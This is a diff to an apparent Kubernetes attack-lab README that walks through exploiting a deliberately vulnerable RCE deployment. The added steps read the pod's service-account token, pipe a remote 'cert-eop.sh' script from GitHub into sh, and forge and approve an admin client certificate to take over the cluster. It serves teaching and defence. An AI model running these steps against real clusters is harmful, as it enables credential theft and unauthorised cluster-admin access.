@@ -49,7 +49,8 @@ cd go-rce-kubernetes && docker build .
 ```
 3. Deploy 
 ```
-kubectl apply -f ./
+kubectl apply -f 00-loose-cert-rbac-policy.yaml
+kubectl apply -f 01-rce-deployment-bad.yaml
 ```
 
 4. Exploit 
@@ -69,16 +70,27 @@ kubectl apply -f ./
    ``` 
  - explore ..
     ```
+    curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.0/bin/linux/amd64/kubectl && chmod 700 kubectl 
+
     ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' get pods
     ```
 
 6. Elevate permissions 
 
 Generate and sign client certificate with elevated permissions
+
+>! Use script to skip this section: 
+>! ``` 
+>! curl https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/cert-eop.sh | sh
+>! ```
+
 ```
-curl -Lo cfssl https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssl_1.5.0_linux_amd64 && chmod 700 cfssl 
+# download tools 
+curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.0/bin/linux/amd64/kubectl && chmod 700 kubectl 
+curl -Lo cfssl https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssl_1.5.0_linux_amd64 && chmod 700 cfssl
 curl -Lo cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssljson_1.5.0_linux_amd64 && chmod 700 cfssljson
 
+# create a certificate signing request
 cat <<EOF | ./cfssl genkey - | ./cfssljson -bare server
 {
   "CN": "admin",
@@ -94,11 +106,13 @@ cat <<EOF | ./cfssl genkey - | ./cfssljson -bare server
 }
 EOF
 
-cat <<EOF | ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt apply -f -
+# create a signing request
+cat <<EOF | ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
+--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt apply -f -
 apiVersion: certificates.k8s.io/v1beta1
 kind: CertificateSigningRequest
 metadata:
-  name: nothing-to-see-here
+  name: evil
 spec:
   signerName: kubernetes.io/legacy-unknown
   request: $(cat server.csr | base64 | tr -d '\n')
@@ -108,12 +122,52 @@ spec:
   - client auth
 EOF
 
-./kubectl certificate approve nothing-to-see-here
+# approve certfiicate request
+./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
+--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+--server='https://kubernetes.default.svc.cluster.local' \
+certificate approve evil
 
-./kubectl get csr nothing-to-see-here -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt 
+# get client cert (server.crt)
+./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
+--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+--server='https://kubernetes.default.svc.cluster.local' \
+get csr evil -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt
+
+# create kubeconfig 
+cat <<EOF > ./config
+apiVersion: v1
+kind: Config
+preferences: {}
+current-context: default
+clusters:
+  - name: default
+    cluster:
+      certificate-authority: /run/secrets/kubernetes.io/serviceaccount/ca.crt 
+      server: https://kubernetes.default.svc.cluster.local
+contexts:
+- context:
+    cluster: default
+    namespace: default
+    user: default
+  name: default
+users:
+  - name: default
+    user:
+      client-certificate: $(pwd)/server.crt 
+      client-key: $(pwd)/server-key.pem
+      username: admin
+EOF
+
+# test
+./kubectl --kubeconfig=config get pods -A
 ```
 
+
+
+
 7. Perform lateral movement
+
 
 8. Add security policies 
 
